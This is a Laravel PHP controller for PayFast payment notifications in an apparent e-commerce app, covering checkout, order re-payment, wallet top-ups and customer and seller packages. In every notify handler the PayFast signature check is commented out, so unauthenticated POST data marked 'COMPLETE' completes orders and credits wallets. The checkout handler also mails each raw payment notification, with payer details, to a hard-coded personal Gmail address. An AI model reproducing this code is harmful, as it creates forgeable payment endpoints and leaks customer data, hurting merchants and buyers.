<?php

namespace App\Http\Controllers\Payment;

use App\Http\Controllers\CheckoutController;
use App\Http\Controllers\Controller;
use App\Http\Controllers\SellerPackageController;
use App\Models\CombinedOrder;
use App\Models\CustomerPackage;
use App\Models\Order;
use App\Models\SellerPackage;
use App\Models\User;
use App\Models\Wallet;
use App\Utility\PayfastUtility;
use Auth;
use Illuminate\Http\Request;
use Mail;
use Session;

class PayfastController extends Controller
{
    private $security_key;

    public function __construct()
    {
    }

    //sample ITN Payload
    /*$ITN_Payload = [
    'm_payment_id' => 'SuperUnique1',
    'pf_payment_id' => '1089250',
    'payment_status' => 'COMPLETE',
    'item_name' => 'test+product',
    'item_description' => ,
    'amount_gross' => 200.00,
    'amount_fee' => -4.60,
    'amount_net' => 195.40,
    'custom_str1' => ,
    'custom_str2' => ,
    'custom_str3' => ,
    'custom_str4' => ,
    'custom_str5' => ,
    'custom_int1' => ,
    'custom_int2' => ,
    'custom_int3' => ,
    'custom_int4' => ,
    'custom_int5' => ,
    'name_first' => ,
    'name_last' => ,
    'email_address' => ,
    'merchant_id' => '10012577',
    'signature' => 'ad8e7685c9522c24365d7ccea8cb3db7'
    ];*/


    public function pay(Request $request)
    {
        if (Session::has('payment_type')) {
            $paymentType = Session::get('payment_type');
            $paymentData = Session::get('payment_data');
            $user_id = Auth::user()->id;

            if ($paymentType == 'cart_payment') {
                $combined_order = CombinedOrder::findOrFail($request->session()->get('combined_order_id'));
                return PayfastUtility::create_checkout_form($combined_order->id, $combined_order->grand_total);
            }
            elseif ($paymentType == 'order_re_payment') {
                $order = Order::findOrFail($paymentData['order_id']);
                return PayfastUtility::create_order_re_payment_form($order->id , $order->grand_total);
            }
            elseif ($paymentType == 'wallet_payment') {
                return PayfastUtility::create_wallet_form($user_id, $request->amount);
            }
            elseif ($paymentType == 'customer_package_payment') {
                $customer_package = CustomerPackage::findOrFail($paymentData['customer_package_id']);
                return PayfastUtility::create_customer_package_form($user_id, $customer_package->id, $customer_package->amount);
            }
            elseif ($paymentType == 'seller_package_payment') {
                $seller_package = SellerPackage::findOrFail($paymentData['seller_package_id']);;
                return PayfastUtility::create_seller_package_form($user_id, $seller_package->id, $seller_package->amount);
            }
        }
    }

    //checkout related functions ------------------------------------<starts>
    public static function checkout_notify()
    {
        // Tell PayFast that this page is reachable by triggering a header 200
        header('HTTP/1.0 200 OK');
        flush();
        $pfData = $_POST;
        // $checks = PayfastUtility::check($pfData);

        try {
            Mail::raw(json_encode($pfData), function ($message) {
                $message->to('hridoymahmud71@gmail.com');
            });

            if (env('DEMO_MODE') != 'On') {
                $path = base_path('payfast.text');
                if (file_exists($path)) {

                    file_put_contents($path, json_encode($pfData));
                }
            }
        } catch (\Exception $e) {
        }

        if ($pfData['payment_status'] == "COMPLETE") {

            //custom_1 will have order_id
            return PayfastController::checkout_success($pfData['custom_str1'], $pfData);
        }

        return PayfastController::checkout_incomplete();
    }

    public static function checkout_return()
    {
        Session::put('cart', collect([]));
        Session::forget('payment_type');
        Session::forget('delivery_info');
        Session::forget('coupon_id');
        Session::forget('coupon_discount');

        flash(translate('Payment process completed'))->success();
        return redirect()->route('order_confirmed');
    }

    public static function checkout_cancel()
    {
        return PayfastController::checkout_incomplete();
    }

    public static function checkout_success($order_id, $responses)
    {
        $payment_details = json_encode($responses);
        $checkoutController = new CheckoutController;
        return $checkoutController->checkout_done($order_id, $payment_details);
    }

    public static function checkout_incomplete()
    {
        Session::forget('combined_order_id');
        flash(translate("Incomplete"))->error();
        //flash(translate('Payment failed'))->error();
        //dd($response_text);
        return redirect()->route('home')->send();
    }
    //checkout related functions ------------------------------------<ends>

    //Order Re payment related related functions ------------------------------------<starts>
    public static function order_re_payment_notify()
    {
        // Tell PayFast that this page is reachable by triggering a header 200
        header('HTTP/1.0 200 OK');
        flush();
        $pfData = $_POST;
        // $checks = PayfastUtility::check($pfData);

        if ($pfData['payment_status'] == "COMPLETE") {
            //custom_1 will have user_id custom_2 will have package_id
            return PayfastController::order_re_payment_success(json_encode($pfData));
        }

        return PayfastController::order_re_payment_incomplete();
    }

    public static function order_re_payment_return()
    {
        return (new CheckoutController)->orderRePaymentDone(Session::get('payment_data'), '');
    }

    public static function order_re_payment_cancel()
    {
        return PayfastController::order_re_payment_incomplete();
    }

    public static function order_re_payment_success($payment_details)
    {
        return (new CheckoutController)->orderRePaymentDone(Session::get('payment_data'), json_encode($payment_details));
    }

    public static function order_re_payment_incomplete()
    {
        Session::forget('payment_data');
        flash(translate("Payment Incomplete"))->error();
        return redirect()->route('home')->send();
    }
    //Order Re payment related functions ------------------------------------<ends>


    //wallet related functions ------------------------------------<starts>
    public static function wallet_notify()
    {
        // Tell PayFast that this page is reachable by triggering a header 200
        header('HTTP/1.0 200 OK');
        flush();
        $pfData = $_POST;
        // $checks = PayfastUtility::check($pfData);

        if ($pfData['payment_status'] == "COMPLETE") {
            //custom_str1 will have user_id
            return PayfastController::wallet_success($pfData['custom_str1'], $pfData['amount_gross'], $_POST);
        }

        return PayfastController::wallet_incomplete();
    }

    public static function wallet_return()
    {
        Session::forget('payment_data');
        Session::forget('payment_type');

        flash(translate('Payment process completed'))->success();
        return redirect()->route('wallet.index');
    }

    public static function wallet_cancel()
    {
        return PayfastController::wallet_incomplete();
    }

    public static function wallet_success($id, $amount, $payment_details)
    {
        $user = User::find($id);
        $user->balance = $user->balance + $amount;
        $user->save();

        $wallet = new Wallet;
        $wallet->user_id = $user->id;
        $wallet->amount = $amount;
        $wallet->payment_method = 'payfast';
        $wallet->payment_details = json_encode($payment_details);
        $wallet->save();
    }

    public static function wallet_incomplete()
    {
        Session::forget('payment_data');
        flash(translate('Payment Incomplete'))->error();
        return redirect()->route('home')->send();
    }
    //wallet related functions ------------------------------------<ends>

    //customer package related functions ------------------------------------<starts>
    public static function customer_package_notify()
    {
        // Tell PayFast that this page is reachable by triggering a header 200
        header('HTTP/1.0 200 OK');
        flush();
        $pfData = $_POST;
        // $checks = PayfastUtility::check($pfData);

        if ($pfData['payment_status'] == "COMPLETE") {
            //custom_str1 will have user_id custom_str1 will have package_id
            return PayfastController::customer_package_success($_POST['custom_str1'], $_POST['custom_str2'], $_POST);
        }

        return PayfastController::customer_package_incomplete();
    }

    public static function customer_package_return()
    {
        Session::forget('payment_data');
        flash(translate('Payment process completed'))->success();
        return redirect()->route('dashboard');
    }

    public static function customer_package_cancel()
    {
        return PayfastController::customer_package_incomplete();
    }

    public static function customer_package_success($id, $customer_package_id, $payment_details)
    {
        $user = User::findOrFail($id);
        $user->customer_package_id = $customer_package_id;
        $customer_package = CustomerPackage::findOrFail($customer_package_id);
        $user->remaining_uploads += $customer_package->product_upload;
        $user->save();
    }

    public static function customer_package_incomplete()
    {
        Session::forget('payment_data');
        flash(translate("Payment Incomplete"))->error();
        return redirect()->route('home')->send();
    }
    //customer package related functions ------------------------------------<ends>

    //Seller package related functions ------------------------------------<starts>
    public static function seller_package_notify()
    {
        // Tell PayFast that this page is reachable by triggering a header 200
        header('HTTP/1.0 200 OK');
        flush();
        $pfData = $_POST;
        // $checks = PayfastUtility::check($pfData);

        if ($pfData['payment_status'] == "COMPLETE") {
            //custom_1 will have user_id custom_2 will have package_id
            return PayfastController::seller_package_success($_POST['custom_str1'], $_POST['custom_str2'], $_POST);
        }

        return PayfastController::seller_package_incomplete();
    }

    public static function seller_package_payment_return()
    {
        return (new SellerPackageController)->purchase_payment_done(Session::get('payment_data'), '');
        // Session::forget('payment_data');
        // flash(translate('Payment process completed'))->success();
        // return redirect()->route('dashboard');
    }

    public static function seller_package_payment_cancel()
    {
        return PayfastController::seller_package_incomplete();
    }

    public static function seller_package_success($id, $seller_package_id, $payment_details)
    {
        return (new SellerPackageController)->purchase_payment_done(Session::get('payment_data'), json_encode($payment_details));
    }

    public static function seller_package_incomplete()
    {
        Session::forget('payment_data');
        flash(translate("Payment Incomplete"))->error();
        return redirect()->route('home')->send();
    }
    //seller package related functions ------------------------------------<ends>


}
